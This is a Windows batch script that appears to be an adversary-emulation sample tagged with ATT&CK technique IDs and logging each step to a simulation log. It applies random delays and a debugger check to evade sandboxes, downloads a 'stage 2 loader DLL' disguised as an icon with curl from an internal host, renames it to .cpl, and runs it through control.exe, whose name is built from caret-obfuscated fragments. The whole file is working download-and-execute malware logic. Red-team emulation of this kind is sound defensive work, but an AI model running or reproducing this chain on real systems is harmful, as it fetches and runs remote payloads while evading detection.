@echo off
SETLOCAL EnableDelayedExpansion

REM PHR_* placeholder assignments (random-named SET variables)
set qwerty=%APPDATA%\11006\702298f9
set asdfgh=716c46e6.txt
set zxcvbn=https://10.0.0.49/stage/2/icon.png?11006-7
set poiuyt=BALAM-S2BO
set lkjhgf=11006
set mnbvcx=7
set rewqas=%PUBLIC%\\macula-simulations.log
set tyuiof=https://10.0.0.49

REM Cache timestamp
set tsvar=!DATE!/!TIME!

REM Log file variable
set logf=!rewqas!

REM === Anti-analysis / Sandbox Evasion (T1497) ===
echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: delay_start>> "!logf!" 2>nul
REM Initial random delay 10-20s
SET /A delay1=%RANDOM% %% 20 + 10
timeout /t !delay1! /nobreak >nul
echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: delay_end>> "!logf!" 2>nul

REM Debugger check (allowed)
echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: debugger_check>> "!logf!" 2>nul
set debugdetected=0
powershell -Command "if ([System.Diagnostics.Debugger]::IsAttached) { exit 1 } else { exit 0 }" >nul 2>&1
if !errorlevel!==1 set debugdetected=1
if !debugdetected!==1 (
    echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: debugger_detected>> "!logf!" 2>nul
    REM Thread.Sleep(random 2000-5000ms) => timeout in seconds (2-5)
    SET /A delaysleep=%RANDOM% %% 4 + 2
    timeout /t !delaysleep! /nobreak >nul
) else (
    echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: debugger_not_detected>> "!logf!" 2>nul
)
echo [!tsvar!][TTP][!poiuyt!][!lkjhgf!]: T1497^|Virtualization/Sandbox Evasion=OK:>> "!logf!" 2>nul

REM === Heartbeat download (Stage 2 Loader DLL) ===
echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: heartbeat_start>> "!logf!" 2>nul
curl -k -s -o "!qwerty!\!asdfgh!" "!zxcvbn!" >nul 2>&1
if !errorlevel! equ 0 (
    echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: heartbeat_complete=0>> "!logf!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: heartbeat_complete=!errorlevel!>> "!logf!" 2>nul
)

REM Intermediate delay 5-15s
SET /A delay2=%RANDOM% %% 11 + 5
ping -n !delay2! 127.0.0.1 >nul

REM === Change working directory ===
echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: chdir_start>> "!logf!" 2>nul
cd /d "!qwerty!" >nul 2>&1
if !errorlevel! equ 0 (echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: chdir_result=0>> "!logf!" 2>nul) else (echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: chdir_result=1>> "!logf!" 2>nul)

REM === Rename .dll to .cpl (Obfuscation T1027) ===
echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: rename_start>> "!logf!" 2>nul
FOR %%i IN ("!asdfgh!") DO SET base_cpl=%%~ni
ren "!asdfgh!" "!base_cpl!.cpl"
if !errorlevel! equ 0 (echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: rename_result=0>> "!logf!" 2>nul) else (echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: rename_result=1>> "!logf!" 2>nul)
echo [!tsvar!][TTP][!poiuyt!][!lkjhgf!]: T1027^|Obfuscated Files or Information=OK:>> "!logf!" 2>nul

REM === LOLBIN proxy execution via control.exe (T1218) ===
echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: controlexec_start>> "!logf!" 2>nul

REM Obfuscated command fragments (medium-heavy escape)
set c1=c^o^n^t
set c2=r^o^l
set c3=.^e^x^e
set escbin=!c1!!c2!!c3!
REM Invoke with full absolute path
CALL !escbin! "!qwerty!\!base_cpl!.cpl"
set lasterr=!errorlevel!
if !lasterr! equ 0 (echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: controlexec_result=0>> "!logf!" 2>nul) else (echo [!tsvar!][DEBUG][!poiuyt!][!lkjhgf!]: controlexec_result=!lasterr!>> "!logf!" 2>nul)
echo [!tsvar!][TTP][!poiuyt!][!lkjhgf!]: T1218^|System Binary Proxy Execution=OK:>> "!logf!" 2>nul

exit /b 0